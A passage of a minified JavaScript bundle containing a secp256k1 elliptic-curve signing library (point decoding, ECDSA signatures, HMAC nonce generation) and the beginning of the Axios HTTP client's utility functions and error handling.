                i = BigInt(22),
                o = BigInt(23),
                s = BigInt(44),
                c = BigInt(88),
                f = (e * e * e) % t,
                h = (f * f * e) % t,
                d = (j(h, l) * h) % t,
                p = (j(d, l) * h) % t,
                g = (j(p, a) * f) % t,
                y = (j(g, r) * g) % t,
                w = (j(y, i) * y) % t,
                m = (j(w, s) * w) % t,
                b = (j(m, c) * m) % t,
                v = (j(b, s) * w) % t,
                E = (j(v, l) * h) % t,
                S = (j(E, o) * y) % t,
                x = (j(S, n) * f) % t,
                A = j(x, a);
              if ((A * A) % t !== e) throw new Error("Cannot find square root");
              return A;
            })(m(n));
            const i = (r & s) === s;
            if (t) i && (r = F(-r));
            else {
              (1 === (1 & e[0])) !== i && (r = F(-r));
            }
            const o = new k(n, r);
            return o.assertValidity(), o;
          }
          static fromUncompressedHex(e) {
            const t = H(e.subarray(1, d + 1)),
              n = H(e.subarray(d + 1, 2 * d + 1)),
              r = new k(t, n);
            return r.assertValidity(), r;
          }
          static fromHex(e) {
            const t = D(e),
              n = t.length,
              r = t[0];
            if (n === d) return this.fromCompressedHex(t);
            if (n === y && (2 === r || 3 === r))
              return this.fromCompressedHex(t);
            if (n === w && 4 === r) return this.fromUncompressedHex(t);
            throw new Error(
              `Point.fromHex: received invalid point. Expected 32-${y} compressed bytes or ${w} uncompressed bytes, not ${n}`
            );
          }
          static fromPrivateKey(e) {
            return k.BASE.multiply(J(e));
          }
          static fromSignature(e, t, n) {
            const { r: r, s: i } = X(t);
            if (![0, 1, 2, 3].includes(n))
              throw new Error("Cannot recover: invalid recovery bit");
            const o = K(D(e)),
              { n: s } = u,
              a = 2 === n || 3 === n ? r + s : r,
              l = z(a, s),
              c = F(-o * l, s),
              f = F(i * l, s),
              h = 1 & n ? "03" : "02",
              d = k.fromHex(h + U(a)),
              p = k.BASE.multiplyAndAddUnsafe(d, c, f);
            if (!p)
              throw new Error("Cannot recover signature: point at infinify");
            return p.assertValidity(), p;
          }
          toRawBytes() {
            let e =
              arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
            return $(this.toHex(e));
          }
          toHex() {
            let e =
              arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
            const t = U(this.x);
            if (e) {
              return `${this.hasEvenY() ? "02" : "03"}${t}`;
            }
            return `04${t}${U(this.y)}`;
          }
          toHexX() {
            return this.toHex(!0).slice(2);
          }
          toRawX() {
            return this.toRawBytes(!0).slice(1);
          }
          assertValidity() {
            const e = "Point is not on elliptic curve",
              { x: t, y: n } = this;
            if (!Y(t) || !Y(n)) throw new Error(e);
            const r = F(n * n);
            if (F(r - m(t)) !== o) throw new Error(e);
          }
          equals(e) {
            return this.x === e.x && this.y === e.y;
          }
          negate() {
            return new k(this.x, F(-this.y));
          }
          double() {
            return S.fromAffine(this).double().toAffine();
          }
          add(e) {
            return S.fromAffine(this).add(S.fromAffine(e)).toAffine();
          }
          subtract(e) {
            return this.add(e.negate());
          }
          multiply(e) {
            return S.fromAffine(this).multiply(e, this).toAffine();
          }
          multiplyAndAddUnsafe(e, t, n) {
            const r = S.fromAffine(this),
              i =
                t === o || t === s || this !== k.BASE
                  ? r.multiplyUnsafe(t)
                  : r.multiply(t),
              a = S.fromAffine(e).multiplyUnsafe(n),
              l = i.add(a);
            return l.equals(S.ZERO) ? void 0 : l.toAffine();
          }
        }
        function T(e) {
          return Number.parseInt(e[0], 16) >= 8 ? "00" + e : e;
        }
        function C(e) {
          if (e.length < 2 || 2 !== e[0])
            throw new Error(`Invalid signature integer tag: ${P(e)}`);
          const t = e[1],
            n = e.subarray(2, t + 2);
          if (!t || n.length !== t)
            throw new Error("Invalid signature integer: wrong length");
          if (0 === n[0] && n[1] <= 127)
            throw new Error("Invalid signature integer: trailing length");
          return { data: H(n), left: e.subarray(t + 2) };
        }
        (k.BASE = new k(u.Gx, u.Gy)), (k.ZERO = new k(o, o));
        class I {
          constructor(e, t) {
            (this.r = e), (this.s = t), this.assertValidity();
          }
          static fromCompact(e) {
            const t = e instanceof Uint8Array,
              n = "Signature.fromCompact";
            if ("string" !== typeof e && !t)
              throw new TypeError(`${n}: Expected string or Uint8Array`);
            const r = t ? P(e) : e;
            if (128 !== r.length) throw new Error(`${n}: Expected 64-byte hex`);
            return new I(L(r.slice(0, 64)), L(r.slice(64, 128)));
          }
          static fromDER(e) {
            const t = e instanceof Uint8Array;
            if ("string" !== typeof e && !t)
              throw new TypeError(
                "Signature.fromDER: Expected string or Uint8Array"
              );
            const { r: n, s: r } = (function (e) {
              if (e.length < 2 || 48 != e[0])
                throw new Error(`Invalid signature tag: ${P(e)}`);
              if (e[1] !== e.length - 2)
                throw new Error("Invalid signature: incorrect length");
              const { data: t, left: n } = C(e.subarray(2)),
                { data: r, left: i } = C(n);
              if (i.length)
                throw new Error(
                  `Invalid signature: left bytes after parsing: ${P(i)}`
                );
              return { r: t, s: r };
            })(t ? e : $(e));
            return new I(n, r);
          }
          static fromHex(e) {
            return this.fromDER(e);
          }
          assertValidity() {
            const { r: e, s: t } = this;
            if (!G(e))
              throw new Error("Invalid Signature: r must be 0 < r < n");
            if (!G(t))
              throw new Error("Invalid Signature: s must be 0 < s < n");
          }
          hasHighS() {
            const e = u.n >> s;
            return this.s > e;
          }
          normalizeS() {
            return this.hasHighS() ? new I(this.r, F(-this.s, u.n)) : this;
          }
          toDERRawBytes() {
            return $(this.toDERHex());
          }
          toDERHex() {
            const e = T(R(this.s)),
              t = T(R(this.r)),
              n = e.length / 2,
              r = t.length / 2,
              i = R(n),
              o = R(r);
            return `30${R(r + n + 4)}02${o}${t}02${i}${e}`;
          }
          toRawBytes() {
            return this.toDERRawBytes();
          }
          toHex() {
            return this.toDERHex();
          }
          toCompactRawBytes() {
            return $(this.toCompactHex());
          }
          toCompactHex() {
            return U(this.r) + U(this.s);
          }
        }
        function O() {
          for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++)
            t[n] = arguments[n];
          if (!t.every((e) => e instanceof Uint8Array))
            throw new Error("Uint8Array list expected");
          if (1 === t.length) return t[0];
          const r = t.reduce((e, t) => e + t.length, 0),
            i = new Uint8Array(r);
          for (let o = 0, s = 0; o < t.length; o++) {
            const e = t[o];
            i.set(e, s), (s += e.length);
          }
          return i;
        }
        const B = Array.from({ length: 256 }, (e, t) =>
          t.toString(16).padStart(2, "0")
        );
        function P(e) {
          if (!(e instanceof Uint8Array))
            throw new Error("Expected Uint8Array");
          let t = "";
          for (let n = 0; n < e.length; n++) t += B[e[n]];
          return t;
        }
        const _ = BigInt(
          "0x10000000000000000000000000000000000000000000000000000000000000000"
        );
        function U(e) {
          if ("bigint" !== typeof e) throw new Error("Expected bigint");
          if (!(o <= e && e < _))
            throw new Error("Expected number 0 <= n < 2^256");
          return e.toString(16).padStart(64, "0");
        }
        function N(e) {
          const t = $(U(e));
          if (32 !== t.length) throw new Error("Error: expected 32 bytes");
          return t;
        }
        function R(e) {
          const t = e.toString(16);
          return 1 & t.length ? `0${t}` : t;
        }
        function L(e) {
          if ("string" !== typeof e)
            throw new TypeError(
              "hexToNumber: expected string, got " + typeof e
            );
          return BigInt(`0x${e}`);
        }
        function $(e) {
          if ("string" !== typeof e)
            throw new TypeError("hexToBytes: expected string, got " + typeof e);
          if (e.length % 2)
            throw new Error(
              "hexToBytes: received invalid unpadded hex" + e.length
            );
          const t = new Uint8Array(e.length / 2);
          for (let n = 0; n < t.length; n++) {
            const r = 2 * n,
              i = e.slice(r, r + 2),
              o = Number.parseInt(i, 16);
            if (Number.isNaN(o) || o < 0)
              throw new Error("Invalid byte sequence");
            t[n] = o;
          }
          return t;
        }
        function H(e) {
          return L(P(e));
        }
        function D(e) {
          return e instanceof Uint8Array ? Uint8Array.from(e) : $(e);
        }
        function M(e) {
          if ("number" === typeof e && Number.isSafeInteger(e) && e > 0)
            return BigInt(e);
          if ("bigint" === typeof e && G(e)) return e;
          throw new TypeError(
            "Expected valid private scalar: 0 < scalar < curve.n"
          );
        }
        function F(e) {
          let t =
            arguments.length > 1 && void 0 !== arguments[1]
              ? arguments[1]
              : u.P;
          const n = e % t;
          return n >= o ? n : t + n;
        }
        function j(e, t) {
          const { P: n } = u;
          let r = e;
          for (; t-- > o; ) (r *= r), (r %= n);
          return r;
        }
        function z(e) {
          let t =
            arguments.length > 1 && void 0 !== arguments[1]
              ? arguments[1]
              : u.P;
          if (e === o || t <= o)
            throw new Error(
              `invert: expected positive integers, got n=${e} mod=${t}`
            );
          let n = F(e, t),
            r = t,
            i = o,
            a = s,
            l = s,
            c = o;
          for (; n !== o; ) {
            const e = r / n,
              t = r % n,
              o = i - l * e,
              s = a - c * e;
            (r = n), (n = t), (i = l), (a = c), (l = o), (c = s);
          }
          if (r !== s) throw new Error("invert: does not exist");
          return F(i, t);
        }
        function K(e) {
          let t =
            arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
          const n = (function (e) {
            const t = 8 * e.length - 8 * p,
              n = H(e);
            return t > 0 ? n >> BigInt(t) : n;
          })(e);
          if (t) return n;
          const { n: r } = u;
          return n >= r ? n - r : n;
        }
        let W, V;
        class q {
          constructor(e, t) {
            if (
              ((this.hashLen = e),
              (this.qByteLen = t),
              "number" !== typeof e || e < 2)
            )
              throw new Error("hashLen must be a number");
            if ("number" !== typeof t || t < 2)
              throw new Error("qByteLen must be a number");
            (this.v = new Uint8Array(e).fill(1)),
              (this.k = new Uint8Array(e).fill(0)),
              (this.counter = 0);
          }
          hmac() {
            for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++)
              t[n] = arguments[n];
            return le.hmacSha256(this.k, ...t);
          }
          hmacSync() {
            for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++)
              t[n] = arguments[n];
            return V(this.k, ...t);
          }
          checkSync() {
            if ("function" !== typeof V)
              throw new v("hmacSha256Sync needs to be set");
          }
          incr() {
            if (this.counter >= 1e3)
              throw new Error(
                "Tried 1,000 k values for sign(), all were invalid"
              );
            this.counter += 1;
          }
          async reseed() {
            let e =
              arguments.length > 0 && void 0 !== arguments[0]
                ? arguments[0]
                : new Uint8Array();
            (this.k = await this.hmac(this.v, Uint8Array.from([0]), e)),
              (this.v = await this.hmac(this.v)),
              0 !== e.length &&
                ((this.k = await this.hmac(this.v, Uint8Array.from([1]), e)),
                (this.v = await this.hmac(this.v)));
          }
          reseedSync() {
            let e =
              arguments.length > 0 && void 0 !== arguments[0]
                ? arguments[0]
                : new Uint8Array();
            this.checkSync(),
              (this.k = this.hmacSync(this.v, Uint8Array.from([0]), e)),
              (this.v = this.hmacSync(this.v)),
              0 !== e.length &&
                ((this.k = this.hmacSync(this.v, Uint8Array.from([1]), e)),
                (this.v = this.hmacSync(this.v)));
          }
          async generate() {
            this.incr();
            let e = 0;
            const t = [];
            for (; e < this.qByteLen; ) {
              this.v = await this.hmac(this.v);
              const n = this.v.slice();
              t.push(n), (e += this.v.length);
            }
            return O(...t);
          }
          generateSync() {
            this.checkSync(), this.incr();
            let e = 0;
            const t = [];
            for (; e < this.qByteLen; ) {
              this.v = this.hmacSync(this.v);
              const n = this.v.slice();
              t.push(n), (e += this.v.length);
            }
            return O(...t);
          }
        }
        function G(e) {
          return o < e && e < u.n;
        }
        function Y(e) {
          return o < e && e < u.P;
        }
        function Z(e, t, n) {
          let r =
            !(arguments.length > 3 && void 0 !== arguments[3]) || arguments[3];
          const { n: i } = u,
            a = K(e, !0);
          if (!G(a)) return;
          const l = z(a, i),
            c = k.BASE.multiply(a),
            f = F(c.x, i);
          if (f === o) return;
          const h = F(l * F(t + n * f, i), i);
          if (h === o) return;
          let d = new I(f, h),
            p = (c.x === d.r ? 0 : 2) | Number(c.y & s);
          return (
            r && d.hasHighS() && ((d = d.normalizeS()), (p ^= 1)),
            { sig: d, recovery: p }
          );
        }
        function J(e) {
          let t;
          if ("bigint" === typeof e) t = e;
          else if ("number" === typeof e && Number.isSafeInteger(e) && e > 0)
            t = BigInt(e);
          else if ("string" === typeof e) {
            if (e.length !== 2 * p)
              throw new Error("Expected 32 bytes of private key");
            t = L(e);
          } else {
            if (!(e instanceof Uint8Array))
              throw new TypeError("Expected valid private key");
            if (e.length !== p)
              throw new Error("Expected 32 bytes of private key");
            t = H(e);
          }
          if (!G(t)) throw new Error("Expected private key: 0 < key < n");
          return t;
        }
        function X(e) {
          if (e instanceof I) return e.assertValidity(), e;
          try {
            return I.fromDER(e);
          } catch (t) {
            return I.fromCompact(e);
          }
        }
        function Q(e) {
          let t =
            arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
          return k.fromPrivateKey(e).toRawBytes(t);
        }
        function ee(e) {
          return H(e.length > d ? e.slice(0, d) : e);
        }
        function te(e) {
          const t = ee(e),
            n = F(t, u.n);
          return ne(n < o ? t : n);
        }
        function ne(e) {
          return N(e);
        }
        function re(e, t, n) {
          if (null == e)
            throw new Error(`sign: expected valid message hash, not "${e}"`);
          const r = D(e),
            i = J(t),
            o = [ne(i), te(r)];
          if (null != n) {
            !0 === n && (n = le.randomBytes(d));
            const e = D(n);
            if (e.length !== d)
              throw new Error(`sign: Expected ${d} bytes of extra data`);
            o.push(e);
          }
          return { seed: O(...o), m: ee(r), d: i };
        }
        function ie(e, t) {
          const { sig: n, recovery: r } = e,
            { der: i, recovered: o } = Object.assign(
              { canonical: !0, der: !0 },
              t
            ),
            s = i ? n.toDERRawBytes() : n.toCompactRawBytes();
          return o ? [s, r] : s;
        }
        function oe(e, t) {
          let n =
            arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
          const { seed: r, m: i, d: o } = re(e, t, n.extraEntropy),
            s = new q(g, p);
          let a;
          for (s.reseedSync(r); !(a = Z(s.generateSync(), i, o, n.canonical)); )
            s.reseedSync();
          return ie(a, n);
        }
        k.BASE._setWindowSize(8);
        const se = {
            node: r || (r = n.t(i, 2)),
            web:
              "object" === typeof self && "crypto" in self
                ? self.crypto
                : void 0,
          },
          ae = {},
          le = {
            bytesToHex: P,
            hexToBytes: $,
            concatBytes: O,
            mod: F,
            invert: z,
            isValidPrivateKey(e) {
              try {
                return J(e), !0;
              } catch (t) {
                return !1;
              }
            },
            _bigintTo32Bytes: N,
            _normalizePrivateKey: J,
            hashToPrivateKey: (e) => {
              e = D(e);
              const t = p + 8;
              if (e.length < t || e.length > 1024)
                throw new Error(
                  "Expected valid bytes of private key as per FIPS 186"
                );
              return N(F(H(e), u.n - s) + s);
            },
            randomBytes: function () {
              let e =
                arguments.length > 0 && void 0 !== arguments[0]
                  ? arguments[0]
                  : 32;
              if (se.web) return se.web.getRandomValues(new Uint8Array(e));
              if (se.node) {
                const { randomBytes: t } = se.node;
                return Uint8Array.from(t(e));
              }
              throw new Error(
                "The environment doesn't have randomBytes function"
              );
            },
            randomPrivateKey: () => le.hashToPrivateKey(le.randomBytes(p + 8)),
            precompute() {
              let e =
                  arguments.length > 0 && void 0 !== arguments[0]
                    ? arguments[0]
                    : 8,
                t =
                  arguments.length > 1 && void 0 !== arguments[1]
                    ? arguments[1]
                    : k.BASE;
              const n = t === k.BASE ? t : new k(t.x, t.y);
              return n._setWindowSize(e), n.multiply(l), n;
            },
            sha256: async function () {
              for (
                var e = arguments.length, t = new Array(e), n = 0;
                n < e;
                n++
              )
                t[n] = arguments[n];
              if (se.web) {
                const e = await se.web.subtle.digest("SHA-256", O(...t));
                return new Uint8Array(e);
              }
              if (se.node) {
                const { createHash: e } = se.node,
                  n = e("sha256");
                return (
                  t.forEach((e) => n.update(e)), Uint8Array.from(n.digest())
                );
              }
              throw new Error("The environment doesn't have sha256 function");
            },
            hmacSha256: async function (e) {
              for (
                var t = arguments.length,
                  n = new Array(t > 1 ? t - 1 : 0),
                  r = 1;
                r < t;
                r++
              )
                n[r - 1] = arguments[r];
              if (se.web) {
                const t = await se.web.subtle.importKey(
                    "raw",
                    e,
                    { name: "HMAC", hash: { name: "SHA-256" } },
                    !1,
                    ["sign"]
                  ),
                  r = O(...n),
                  i = await se.web.subtle.sign("HMAC", t, r);
                return new Uint8Array(i);
              }
              if (se.node) {
                const { createHmac: t } = se.node,
                  r = t("sha256", e);
                return (
                  n.forEach((e) => r.update(e)), Uint8Array.from(r.digest())
                );
              }
              throw new Error(
                "The environment doesn't have hmac-sha256 function"
              );
            },
            sha256Sync: void 0,
            hmacSha256Sync: void 0,
            taggedHash: async function (e) {
              let t = ae[e];
              if (void 0 === t) {
                const n = await le.sha256(
                  Uint8Array.from(e, (e) => e.charCodeAt(0))
                );
                (t = O(n, n)), (ae[e] = t);
              }
              for (
                var n = arguments.length,
                  r = new Array(n > 1 ? n - 1 : 0),
                  i = 1;
                i < n;
                i++
              )
                r[i - 1] = arguments[i];
              return le.sha256(t, ...r);
            },
            taggedHashSync: function (e) {
              if ("function" !== typeof W)
                throw new v("sha256Sync is undefined, you need to set it");
              let t = ae[e];
              if (void 0 === t) {
                const n = W(Uint8Array.from(e, (e) => e.charCodeAt(0)));
                (t = O(n, n)), (ae[e] = t);
              }
              for (
                var n = arguments.length,
                  r = new Array(n > 1 ? n - 1 : 0),
                  i = 1;
                i < n;
                i++
              )
                r[i - 1] = arguments[i];
              return W(t, ...r);
            },
            _JacobianPoint: S,
          };
        Object.defineProperties(le, {
          sha256Sync: {
            configurable: !1,
            get: () => W,
            set(e) {
              W || (W = e);
            },
          },
          hmacSha256Sync: {
            configurable: !1,
            get: () => V,
            set(e) {
              V || (V = e);
            },
          },
        });
      },
      1243: (e, t, n) => {
        "use strict";
        function r(e, t) {
          return function () {
            return e.apply(t, arguments);
          };
        }
        n.d(t, { Z: () => Fe });
        const { toString: i } = Object.prototype,
          { getPrototypeOf: o } = Object,
          s =
            ((a = Object.create(null)),
            (e) => {
              const t = i.call(e);
              return a[t] || (a[t] = t.slice(8, -1).toLowerCase());
            });
        var a;
        const l = (e) => ((e = e.toLowerCase()), (t) => s(t) === e),
          c = (e) => (t) => typeof t === e,
          { isArray: u } = Array,
          f = c("undefined");
        const h = l("ArrayBuffer");
        const d = c("string"),
          p = c("function"),
          g = c("number"),
          y = (e) => null !== e && "object" === typeof e,
          w = (e) => {
            if ("object" !== s(e)) return !1;
            const t = o(e);
            return (
              (null === t ||
                t === Object.prototype ||
                null === Object.getPrototypeOf(t)) &&
              !(Symbol.toStringTag in e) &&
              !(Symbol.iterator in e)
            );
          },
          m = l("Date"),
          b = l("File"),
          v = l("Blob"),
          E = l("FileList"),
          S = l("URLSearchParams");
        function x(e, t) {
          let n,
            r,
            { allOwnKeys: i = !1 } =
              arguments.length > 2 && void 0 !== arguments[2]
                ? arguments[2]
                : {};
          if (null !== e && "undefined" !== typeof e)
            if (("object" !== typeof e && (e = [e]), u(e)))
              for (n = 0, r = e.length; n < r; n++) t.call(null, e[n], n, e);
            else {
              const r = i ? Object.getOwnPropertyNames(e) : Object.keys(e),
                o = r.length;
              let s;
              for (n = 0; n < o; n++) (s = r[n]), t.call(null, e[s], s, e);
            }
        }
        function A(e, t) {
          t = t.toLowerCase();
          const n = Object.keys(e);
          let r,
            i = n.length;
          for (; i-- > 0; ) if (((r = n[i]), t === r.toLowerCase())) return r;
          return null;
        }
        const k =
            "undefined" !== typeof globalThis
              ? globalThis
              : "undefined" !== typeof self
              ? self
              : "undefined" !== typeof window
              ? window
              : global,
          T = (e) => !f(e) && e !== k;
        const C =
          ((I = "undefined" !== typeof Uint8Array && o(Uint8Array)),
          (e) => I && e instanceof I);
        var I;
        const O = l("HTMLFormElement"),
          B = ((e) => {
            let { hasOwnProperty: t } = e;
            return (e, n) => t.call(e, n);
          })(Object.prototype),
          P = l("RegExp"),
          _ = (e, t) => {
            const n = Object.getOwnPropertyDescriptors(e),
              r = {};
            x(n, (n, i) => {
              !1 !== t(n, i, e) && (r[i] = n);
            }),
              Object.defineProperties(e, r);
          },
          U = "abcdefghijklmnopqrstuvwxyz",
          N = "0123456789",
          R = { DIGIT: N, ALPHA: U, ALPHA_DIGIT: U + U.toUpperCase() + N };
        const L = l("AsyncFunction"),
          $ = {
            isArray: u,
            isArrayBuffer: h,
            isBuffer: function (e) {
              return (
                null !== e &&
                !f(e) &&
                null !== e.constructor &&
                !f(e.constructor) &&
                p(e.constructor.isBuffer) &&
                e.constructor.isBuffer(e)
              );
            },
            isFormData: (e) => {
              let t;
              return (
                e &&
                (("function" === typeof FormData && e instanceof FormData) ||
                  (p(e.append) &&
                    ("formdata" === (t = s(e)) ||
                      ("object" === t &&
                        p(e.toString) &&
                        "[object FormData]" === e.toString()))))
              );
            },
            isArrayBufferView: function (e) {
              let t;
              return (
                (t =
                  "undefined" !== typeof ArrayBuffer && ArrayBuffer.isView
                    ? ArrayBuffer.isView(e)
                    : e && e.buffer && h(e.buffer)),
                t
              );
            },
            isString: d,
            isNumber: g,
            isBoolean: (e) => !0 === e || !1 === e,
            isObject: y,
            isPlainObject: w,
            isUndefined: f,
            isDate: m,
            isFile: b,
            isBlob: v,
            isRegExp: P,
            isFunction: p,
            isStream: (e) => y(e) && p(e.pipe),
            isURLSearchParams: S,
            isTypedArray: C,
            isFileList: E,
            forEach: x,
            merge: function e() {
              const { caseless: t } = (T(this) && this) || {},
                n = {},
                r = (r, i) => {
                  const o = (t && A(n, i)) || i;
                  w(n[o]) && w(r)
                    ? (n[o] = e(n[o], r))
                    : w(r)
                    ? (n[o] = e({}, r))
                    : u(r)
                    ? (n[o] = r.slice())
                    : (n[o] = r);
                };
              for (let i = 0, o = arguments.length; i < o; i++)
                arguments[i] && x(arguments[i], r);
              return n;
            },
            extend: function (e, t, n) {
              let { allOwnKeys: i } =
                arguments.length > 3 && void 0 !== arguments[3]
                  ? arguments[3]
                  : {};
              return (
                x(
                  t,
                  (t, i) => {
                    n && p(t) ? (e[i] = r(t, n)) : (e[i] = t);
                  },
                  { allOwnKeys: i }
                ),
                e
              );
            },
            trim: (e) =>
              e.trim
                ? e.trim()
                : e.replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g, ""),
            stripBOM: (e) => (65279 === e.charCodeAt(0) && (e = e.slice(1)), e),
            inherits: (e, t, n, r) => {
              (e.prototype = Object.create(t.prototype, r)),
                (e.prototype.constructor = e),
                Object.defineProperty(e, "super", { value: t.prototype }),
                n && Object.assign(e.prototype, n);
            },
            toFlatObject: (e, t, n, r) => {
              let i, s, a;
              const l = {};
              if (((t = t || {}), null == e)) return t;
              do {
                for (i = Object.getOwnPropertyNames(e), s = i.length; s-- > 0; )
                  (a = i[s]),
                    (r && !r(a, e, t)) || l[a] || ((t[a] = e[a]), (l[a] = !0));
                e = !1 !== n && o(e);
              } while (e && (!n || n(e, t)) && e !== Object.prototype);
              return t;
            },
            kindOf: s,
            kindOfTest: l,
            endsWith: (e, t, n) => {
              (e = String(e)),
                (void 0 === n || n > e.length) && (n = e.length),
                (n -= t.length);
              const r = e.indexOf(t, n);
              return -1 !== r && r === n;
            },
            toArray: (e) => {
              if (!e) return null;
              if (u(e)) return e;
              let t = e.length;
              if (!g(t)) return null;
              const n = new Array(t);
              for (; t-- > 0; ) n[t] = e[t];
              return n;
            },
            forEachEntry: (e, t) => {
              const n = (e && e[Symbol.iterator]).call(e);
              let r;
              for (; (r = n.next()) && !r.done; ) {
                const n = r.value;
                t.call(e, n[0], n[1]);
              }
            },
            matchAll: (e, t) => {
              let n;
              const r = [];
              for (; null !== (n = e.exec(t)); ) r.push(n);
              return r;
            },
            isHTMLForm: O,
            hasOwnProperty: B,
            hasOwnProp: B,
            reduceDescriptors: _,
            freezeMethods: (e) => {
              _(e, (t, n) => {
                if (p(e) && -1 !== ["arguments", "caller", "callee"].indexOf(n))
                  return !1;
                const r = e[n];
                p(r) &&
                  ((t.enumerable = !1),
                  "writable" in t
                    ? (t.writable = !1)
                    : t.set ||
                      (t.set = () => {
                        throw Error(
                          "Can not rewrite read-only method '" + n + "'"
                        );
                      }));
              });
            },
            toObjectSet: (e, t) => {
              const n = {},
                r = (e) => {
                  e.forEach((e) => {
                    n[e] = !0;
                  });
                };
              return u(e) ? r(e) : r(String(e).split(t)), n;
            },
            toCamelCase: (e) =>
              e
                .toLowerCase()
                .replace(/[-_\s]([a-z\d])(\w*)/g, function (e, t, n) {
                  return t.toUpperCase() + n;
                }),
            noop: () => {},
            toFiniteNumber: (e, t) => ((e = +e), Number.isFinite(e) ? e : t),
            findKey: A,
            global: k,
            isContextDefined: T,
            ALPHABET: R,
            generateString: function () {
              let e =
                  arguments.length > 0 && void 0 !== arguments[0]
                    ? arguments[0]
                    : 16,
                t =
                  arguments.length > 1 && void 0 !== arguments[1]
                    ? arguments[1]
                    : R.ALPHA_DIGIT,
                n = "";
              const { length: r } = t;
              for (; e--; ) n += t[(Math.random() * r) | 0];
              return n;
            },
            isSpecCompliantForm: function (e) {
              return !!(
                e &&
                p(e.append) &&
                "FormData" === e[Symbol.toStringTag] &&
                e[Symbol.iterator]
              );
            },
            toJSONObject: (e) => {
              const t = new Array(10),
                n = (e, r) => {
                  if (y(e)) {
                    if (t.indexOf(e) >= 0) return;
                    if (!("toJSON" in e)) {
                      t[r] = e;
                      const i = u(e) ? [] : {};
                      return (
                        x(e, (e, t) => {
                          const o = n(e, r + 1);
                          !f(o) && (i[t] = o);
                        }),
                        (t[r] = void 0),
                        i
                      );
                    }
                  }
                  return e;
                };
              return n(e, 0);
            },
            isAsyncFn: L,
            isThenable: (e) => e && (y(e) || p(e)) && p(e.then) && p(e.catch),
          };
        function H(e, t, n, r, i) {
          Error.call(this),
            Error.captureStackTrace
              ? Error.captureStackTrace(this, this.constructor)
              : (this.stack = new Error().stack),
            (this.message = e),
            (this.name = "AxiosError"),
            t && (this.code = t),
            n && (this.config = n),
            r && (this.request = r),
            i && (this.response = i);
        }
        $.inherits(H, Error, {
          toJSON: function () {
            return {
              message: this.message,
              name: this.name,
              description: this.description,
              number: this.number,
              fileName: this.fileName,
              lineNumber: this.lineNumber,
              columnNumber: this.columnNumber,
              stack: this.stack,
              config: $.toJSONObject(this.config),
              code: this.code,
              status:
                this.response && this.response.status
                  ? this.response.status
                  : null,
            };
          },
        });
        const D = H.prototype,
          M = {};
        [
          "ERR_BAD_OPTION_VALUE",
          "ERR_BAD_OPTION",
          "ECONNABORTED",
          "ETIMEDOUT",
          "ERR_NETWORK",
          "ERR_FR_TOO_MANY_REDIRECTS",
          "ERR_DEPRECATED",
          "ERR_BAD_RESPONSE",
          "ERR_BAD_REQUEST",
          "ERR_CANCELED",
          "ERR_NOT_SUPPORT",
          "ERR_INVALID_URL",
        ].forEach((e) => {
          M[e] = { value: e };
        }),
          Object.defineProperties(H, M),
          Object.defineProperty(D, "isAxiosError", { value: !0 }),
          (H.from = (e, t, n, r, i, o) => {
            const s = Object.create(D);
            return (
              $.toFlatObject(
                e,
                s,
                function (e) {
                  return e !== Error.prototype;
                },
                (e) => "isAxiosError" !== e
              ),
              H.call(s, e.message, t, n, r, i),
              (s.cause = e),
              (s.name = e.name),
              o && Object.assign(s, o),
              s
            );
          });
        const F = H;
        var j = n(9778).lW;
        function z(e) {
          return $.isPlainObject(e) || $.isArray(e);
        }
        function K(e) {
          return $.endsWith(e, "[]") ? e.slice(0, -2) : e;
        }
        function W(e, t, n) {
          return e
            ? e
                .concat(t)
                .map(function (e, t) {
                  return (e = K(e)), !n && t ? "[" + e + "]" : e;
                })
                .join(n ? "." : "")
            : t;
        }
        const V = $.toFlatObject($, {}, null, function (e) {
          return /^is[A-Z]/.test(e);
        });
        const q = function (e, t, n) {
          if (!$.isObject(e)) throw new TypeError("target must be an object");
          t = t || new FormData();
          const r = (n = $.toFlatObject(
              n,
              { metaTokens: !0, dots: !1, indexes: !1 },
              !1,
              function (e, t) {
                return !$.isUndefined(t[e]);
              }
            )).metaTokens,
            i = n.visitor || c,
            o = n.dots,
            s = n.indexes,
            a =
              (n.Blob || ("undefined" !== typeof Blob && Blob)) &&
              $.isSpecCompliantForm(t);
          if (!$.isFunction(i))
            throw new TypeError("visitor must be a function");
          function l(e) {
            if (null === e) return "";
            if ($.isDate(e)) return e.toISOString();
            if (!a && $.isBlob(e))
              throw new F("Blob is not supported. Use a Buffer instead.");
            return $.isArrayBuffer(e) || $.isTypedArray(e)
              ? a && "function" === typeof Blob
                ? new Blob([e])
                : j.from(e)
              : e;
          }
          function c(e, n, i) {
            let a = e;
            if (e && !i && "object" === typeof e)
              if ($.endsWith(n, "{}"))
                (n = r ? n : n.slice(0, -2)), (e = JSON.stringify(e));
              else if (
                ($.isArray(e) &&
                  (function (e) {
                    return $.isArray(e) && !e.some(z);
                  })(e)) ||
                (($.isFileList(e) || $.endsWith(n, "[]")) && (a = $.toArray(e)))
              )
                return (
                  (n = K(n)),
                  a.forEach(function (e, r) {
                    !$.isUndefined(e) &&
                      null !== e &&
                      t.append(
                        !0 === s ? W([n], r, o) : null === s ? n : n + "[]",
                        l(e)
                      );
                  }),
                  !1
                );
            return !!z(e) || (t.append(W(i, n, o), l(e)), !1);
          }
          const u = [],
            f = Object.assign(V, {
              defaultVisitor: c,
              convertValue: l,
              isVisitable: z,
            });
          if (!$.isObject(e)) throw new TypeError("data must be an object");
          return (
            (function e(n, r) {
              if (!$.isUndefined(n)) {
                if (-1 !== u.indexOf(n))
                  throw Error("Circular reference detected in " + r.join("."));
                u.push(n),
                  $.forEach(n, function (n, o) {
                    !0 ===
                      (!($.isUndefined(n) || null === n) &&
                        i.call(t, n, $.isString(o) ? o.trim() : o, r, f)) &&
                      e(n, r ? r.concat(o) : [o]);
                  }),
                  u.pop();
              }
            })(e),
            t
          );
        };
        function G(e) {
          const t = {
            "!": "%21",
            "'": "%27",
            "(": "%28",
            ")": "%29",
            "~": "%7E",
            "%20": "+",
            "%00": "\0",
          };
          return encodeURIComponent(e).replace(
            /[!'()~]|%20|%00/g,
            function (e) {
              return t[e];
            }
          );
        }
